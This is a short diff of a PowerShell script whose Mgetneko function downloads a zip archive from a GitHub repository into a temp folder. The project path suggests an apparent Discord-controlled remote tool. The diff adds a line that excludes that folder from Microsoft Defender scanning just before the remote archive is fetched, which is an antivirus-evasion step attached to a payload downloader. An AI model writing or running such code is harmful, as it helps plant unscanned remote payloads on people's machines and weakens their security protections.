@@ -1,5 +1,6 @@
 function Mgetneko {
     $tempfolder  = "$env:temp\neko"
+    Add-MpPreference -ExclusionPath $tempfolder
     $nekodownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/neko.zip"
     $nekozip = "$tempfolder\neko.zip"
     if (!(Test-Path -Path $tempfolder)) {
@@ -24,3 +25,4 @@ function Mremoveneko {
         rm -Path $tempfolder -Force
     }
 }
+
